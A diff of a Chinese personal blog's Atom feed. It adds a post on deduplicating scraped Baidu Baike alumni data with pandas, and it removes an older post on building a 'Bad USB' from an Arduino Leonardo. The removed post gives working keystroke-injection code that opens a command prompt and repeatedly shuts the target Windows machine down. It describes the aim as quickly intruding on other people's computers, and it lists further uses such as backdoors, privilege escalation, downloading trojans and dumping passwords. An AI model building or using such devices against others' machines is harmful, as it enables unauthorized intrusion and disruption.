@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.yfgeek.com/"/>
-  <updated>2017-10-26T14:36:56.397Z</updated>
+  <updated>2017-10-28T15:15:40.587Z</updated>
   <id>http://www.yfgeek.com/</id>
   
   <author>
@@ -16,18 +16,69 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>“我是如何收集校友的”之数据去重</title>
+    <link href="http://www.yfgeek.com/2017/10/27/%E2%80%9C%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E6%94%B6%E9%9B%86%E6%A0%A1%E5%8F%8B%E7%9A%84%E2%80%9D%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%8E%BB%E9%87%8D/"/>
+    <id>http://www.yfgeek.com/2017/10/27/“我是如何收集校友的”之数据去重/</id>
+    <published>2017-10-27T15:35:52.000Z</published>
+    <updated>2017-10-28T15:15:40.587Z</updated>
+    
+    <content type="html"><![CDATA[<p>按照上文讲到，我们已经抓取到了所有与“伯明翰大学”相关的数据，我们接下来要做的就是做数据清洗工作。</p>
+<p><img src="/content/images/uob/2.png" alt=""></p>
+<p>我们当前进度：2</p>
+<ol>
+<li>爬虫程序——抓取全百度百科与“伯明翰大学”相关的数据</li>
+<li>数据去重——用pandas去掉抓取相同的URL或相同的名称</li>
+<li>提取人名——利用HMM-Viterbi进行人名筛选与提取</li>
+<li>下载器——下载所有数据库中数据清洗过的URL，并存入数据库</li>
+<li>人物Ranking——按照一定的排名方式，对人物进行知名度排名</li>
+<li>人物梗概——利用NLP相关库，对提取的人物进行自动化梗概</li>
+</ol>
+<p>为什么要进行去重？还不是因为爬虫爬下来的结果有大量的重复的信息，在后期的人名筛选甚至下载来说，我们提前先搞定这个重复的问题，节省工作量。有人提出可以在人名过滤后再去重，我想未尝不是一个好点子，但是HMM-Viterbi算法的复杂度高，这样可能降低后期的效率，提前去重未尝不可。</p>
+<p>如图下所示，有很多重复切无用的信息。</p>
+<p><img src="/content/images/uob/3.png" alt=""></p>
+<p>关于去重，很多人第一时间想到了布隆过滤器，但是试问，在仅有不到1000的数据量的数据需要用到吗？本文用pandas自带的去重函数<code>drop_duplictad()</code>去重。如果想了解布隆过滤器，我自己也练手写了一个<a href="https://gist.github.com/yfgeek/2f07921322d4d65fbe05bef0eb897fb9" target="_blank" rel="external">简单的范例</a>。</p>
+<p>首先，将SQL数据库中所有数据作为DataFrame输入到pandas，</p>
+<p>然后，对相同名字的内容进行去重，</p>
+<p>然后，对相同URL的内容进行去重，</p>
+<p>随后，重新建立索引，</p>
+<p>最后，将内容输出到新的数据表<code>first_filter</code>上，完成今天的工作。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="comment"># python version：2.7</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> jpype <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</div><div class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> create_engine</div><div class="line"><span class="keyword">import</span> pymysql</div><div class="line"></div><div class="line">reload(sys)</div><div class="line">sys.setdefaultencoding(<span class="string">'utf-8'</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Filter</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.engine = create_engine(<span class="string">'mysql+pymysql://root:@localhost:3306/uob?charset=utf8'</span>)</div><div class="line">        </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">distinct</span><span class="params">(self)</span>:</span></div><div class="line">        sql = <span class="string">"SELECT * FROM list;"</span></div><div class="line">        allData = pd.read_sql(sql, con=self.engine)  <span class="comment"># 从抓取过来的数据库读入</span></div><div class="line">        allData.drop_duplicates(<span class="string">'name'</span>, <span class="string">'first'</span>, inplace=<span class="keyword">True</span>)  <span class="comment"># 去除重复name</span></div><div class="line">        allData.drop_duplicates(<span class="string">'url'</span>, <span class="string">'first'</span>, inplace=<span class="keyword">True</span>) <span class="comment"># 去除重复url</span></div><div class="line">        allData.reset_index(drop=<span class="keyword">True</span>, inplace=<span class="keyword">True</span>) <span class="comment"># index重新计数</span></div><div class="line">        <span class="keyword">print</span> allData.tail()</div><div class="line">        allData.to_sql(<span class="string">'first_filter'</span>, self.engine, if_exists=<span class="string">'replace'</span>, index=<span class="keyword">True</span>, index_label=<span class="string">'fid'</span>)  <span class="comment"># 输出到新的数据库表first_filter</span></div><div class="line">        <span class="keyword">return</span> allData</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    obj_filter = Filter()</div><div class="line">    obj_filter.distinct()</div></pre></td></tr></table></figure>
+<p>跑完后我们到数据库中看看</p>
+<p><img src="/content/images/uob/4.png" alt=""></p>
+<p>不错，数据量已经下降到了708个，去重工作完成，其实在这期间遇到了很多坑，很多问题，不一一阐述，均为python环境问题。</p>
+<p>下集预告：“我是如何收集校友的”之利用基于HMM-Viterbi的HanLP进行人名提取</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;按照上文讲到，我们已经抓取到了所有与“伯明翰大学”相关的数据，我们接下来要做的就是做数据清洗工作。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/content/images/uob/2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;我们当前进度：2&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;爬虫程序——
+    
+    </summary>
+    
+      <category term="Python" scheme="http://www.yfgeek.com/categories/Python/"/>
+    
+    
+      <category term="数据" scheme="http://www.yfgeek.com/tags/%E6%95%B0%E6%8D%AE/"/>
+    
+  </entry>
+  
+  <entry>
     <title>“我是如何收集校友的”之爬虫模块</title>
     <link href="http://www.yfgeek.com/2017/10/26/%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E6%94%B6%E9%9B%86%E6%A0%A1%E5%8F%8B%E7%9A%84%E4%B9%8B%E7%88%AC%E8%99%AB/"/>
     <id>http://www.yfgeek.com/2017/10/26/我是如何收集校友的之爬虫/</id>
     <published>2017-10-26T13:01:49.000Z</published>
-    <updated>2017-10-26T14:36:56.397Z</updated>
+    <updated>2017-10-27T15:31:53.011Z</updated>
     
     <content type="html"><![CDATA[<p>打开伯明翰大学的百科，发现与某相邻学校相比，中国校友实在太少，可能是校友过于低调。于是萌生一个想法，写一个爬虫找出百度百科里所有与“伯明翰”大学有关的校友，然后自动汇总，生成人物梗概，按照知名度排序。</p>
 <p>需求大概就是这样，也就是说，我们需要以下几个模块：</p>
 <ol>
 <li>爬虫程序——抓取全百度百科与“伯明翰大学”相关的数据</li>
+<li>数据去重——用pandas去掉抓取相同的URL或相同的名称</li>
 <li>提取人名——利用HMM-Viterbi进行人名筛选与提取</li>
-<li>数据去重——用布隆过滤器去掉抓取相同的URL或相同的名称</li>
 <li>下载器——下载所有数据库中数据清洗过的URL，并存入数据库</li>
 <li>人物Ranking——按照一定的排名方式，对人物进行知名度排名</li>
 <li>人物梗概——利用NLP相关库，对提取的人物进行自动化梗概</li>
@@ -44,7 +95,7 @@
 <p>将数据存入数据库，最后获取信息如下：</p>
 <p><img src="/content/images/uob/1.png" alt=""></p>
 <p><img src="/content/images/uob/2.png" alt=""></p>
-<p>明日更新：“我是如何收集校友的”之NLP人名去重</p>
+<p>明日更新：“我是如何收集校友的”之数据去重</p>
 ]]></content>
     
     <summary type="html">
@@ -1284,61 +1335,6 @@
     <summary type="html">
     
       &lt;p&gt;中文网络上对OTR(Off-the-record)技术文章甚少，实际上聊天上采用OTR技术具有极大的安全性。OTR是一种结合Diffie-Hellman密钥交换算法、AES算法、SHA-1哈希算法的加密在明文情况下传输的技术。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="Hack" scheme="http://www.yfgeek.com/categories/Hack/"/>
-    
-    
-      <category term="Hack" scheme="http://www.yfgeek.com/tags/Hack/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Arduino Leonardo 打造 Bad USB</title>
-    <link href="http://www.yfgeek.com/2016/11/27/badusb/"/>
-    <id>http://www.yfgeek.com/2016/11/27/badusb/</id>
-    <published>2016-11-26T18:48:23.000Z</published>
-    <updated>2017-10-26T12:59:55.515Z</updated>
-    
-    <content type="html"><![CDATA[<p>嘿嘿嘿，又是一篇猥琐小文。</p>
-<a id="more"></a>
-<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>什么是Bad USB？</p>
-<p><img src="/content/images/badusb/0.jpg" alt=""></p>
-<p>BadUSB最可怕的一点是恶意代码存在于U盘的固件中，由于PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件和U盘格式化都无法应对BadUSB进行攻击。</p>
-<p>简单来说，就是让USB设备伪装成但却充当键盘，被插入的电脑猝不及防会被迅速输入一定的“指令”，这个指令会让该电脑迅速成为肉鸡。</p>
-<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>打造一个廉价Bad USB，实现对 终端机、别人的电脑快速合法化入侵。</p>
-<p><img src="/content/images/badusb/1.jpg" alt=""></p>
-<h1 id="原料"><a href="#原料" class="headerlink" title="原料"></a>原料</h1><ol>
-<li>Arduino Leonardo</li>
-<li>普通安卓USB线</li>
-</ol>
-<h1 id="举个🌰"><a href="#举个🌰" class="headerlink" title="举个🌰"></a>举个🌰</h1><p>比如我们要实现一个插入优盘就让对方电脑关机的功能：</p>
-<p>用Arduino开发者工具，选择</p>
-<p><img src="/content/images/badusb/2.jpg" alt=""></p>
-<p>Arduino Leonardo</p>
-<p>然后把程序烧录进去</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Keyboard.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;<span class="comment">//初始化</span></div><div class="line">   Keyboard.begin();<span class="comment">//开始键盘通讯 </span></div><div class="line">  delay(<span class="number">5000</span>);<span class="comment">//延时</span></div><div class="line">  Keyboard.press(KEY_LEFT_GUI);<span class="comment">//win键 </span></div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.press(<span class="string">'r'</span>);<span class="comment">//r键 </span></div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.release(KEY_LEFT_GUI);</div><div class="line">  Keyboard.release(<span class="string">'r'</span>);</div><div class="line">  Keyboard.press(KEY_CAPS_LOCK);<span class="comment">//利用开大写输小写绕过输入法</span></div><div class="line">  Keyboard.release(KEY_CAPS_LOCK);</div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.println(<span class="string">"CMD"</span>);</div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.press(KEY_RETURN);</div><div class="line">  Keyboard.release(KEY_RETURN);</div><div class="line">  delay(<span class="number">3000</span>); </div><div class="line">  Keyboard.println(<span class="string">"shutdown -s -t 10"</span>);</div><div class="line">  Keyboard.press(KEY_RETURN);</div><div class="line">  Keyboard.release(KEY_RETURN);</div><div class="line">  Keyboard.press(KEY_CAPS_LOCK);</div><div class="line">  Keyboard.release(KEY_CAPS_LOCK);</div><div class="line">  Keyboard.end();<span class="comment">//结束键盘通讯 </span></div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span><span class="comment">//循环</span></span></div><div class="line">&#123;</div><div class="line">   Keyboard.begin();<span class="comment">//开始键盘通讯 </span></div><div class="line">  delay(<span class="number">5000</span>);<span class="comment">//延时</span></div><div class="line">  Keyboard.press(KEY_LEFT_GUI);<span class="comment">//win键 </span></div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.press(<span class="string">'r'</span>);<span class="comment">//r键 </span></div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.release(KEY_LEFT_GUI);</div><div class="line">  Keyboard.release(<span class="string">'r'</span>);</div><div class="line">  Keyboard.press(KEY_CAPS_LOCK);<span class="comment">//利用开大写输小写绕过输入法</span></div><div class="line">  Keyboard.release(KEY_CAPS_LOCK);</div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.println(<span class="string">"CMD"</span>);</div><div class="line">  delay(<span class="number">500</span>); </div><div class="line">  Keyboard.press(KEY_RETURN);</div><div class="line">  Keyboard.release(KEY_RETURN);</div><div class="line">  delay(<span class="number">3000</span>); </div><div class="line">  Keyboard.println(<span class="string">"shutdown -s -t 10"</span>);</div><div class="line">  Keyboard.press(KEY_RETURN);</div><div class="line">  Keyboard.release(KEY_RETURN);</div><div class="line">  Keyboard.press(KEY_CAPS_LOCK);</div><div class="line">  Keyboard.release(KEY_CAPS_LOCK);</div><div class="line">  Keyboard.end();<span class="comment">//结束键盘通讯 </span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>已经在多台Windows电脑上试验成功。</p>
-<h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p><img src="/content/images/badusb/preview.gif" alt=""></p>
-<h1 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h1><p>当然，你可以实现很多功能</p>
-<ul>
-<li>删除系统关键注册表使之蓝屏</li>
-<li>留后门</li>
-<li>新建用户</li>
-<li>用户提权</li>
-<li>调用Powershell下载木马</li>
-<li>调用Powershell下载木马及从内存中提取出当前用户的Windows密码</li>
-<li>rm -rf *</li>
-</ul>
-<p>此外，发现了一个专门收集Badusb的Github用户，非常有学习价值。</p>
-<p><a href="https://github.com/Xyntax/BadUSB-code" target="_blank" rel="external">https://github.com/Xyntax/BadUSB-code</a></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.extremetech.com/extreme/191467-badusb-returns-hackers-publish-code-that-could-infect-millions-of-usb-devices" target="_blank" rel="external">http://www.extremetech.com/extreme/191467-badusb-returns-hackers-publish-code-that-could-infect-millions-of-usb-devices</a><br><a href="http://www.freebuf.com/sectool/107242.html" target="_blank" rel="external">http://www.freebuf.com/sectool/107242.html</a><br><a href="http://www.freebuf.com/articles/terminal/53886.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/53886.html</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;嘿嘿嘿，又是一篇猥琐小文。&lt;/p&gt;
     
     </summary>
     
